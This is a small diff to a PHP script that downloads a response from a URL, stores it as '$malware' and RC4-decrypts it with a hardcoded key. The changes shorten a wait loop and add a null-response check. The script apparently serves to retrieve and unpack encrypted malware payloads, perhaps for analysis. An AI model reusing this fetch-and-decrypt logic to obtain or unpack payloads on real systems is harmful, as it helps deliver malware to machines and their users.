@@ -197,15 +197,21 @@ for($i=0; $i<count($code); $i++)
 echo '[+] ' . $url . PHP_EOL;
 
 echo '[+] Waiting';
-for($i=0; $i<5; $i++)
+for($i=0; $i<3; $i++)
 {
     echo '.';
     sleep(1);
 }
 echo PHP_EOL;
 
-$malware = Request::get($url, $old_url);
+$malware = Request::get($url, null);
 $malware = $malware['body'];
+
+if($malware == null)
+{
+    echo '[!] NULL Response...';
+    exit(-1);
+}
 
 $key = 'gexywoaxor';
 $malware = RC4::calc($malware, $key);
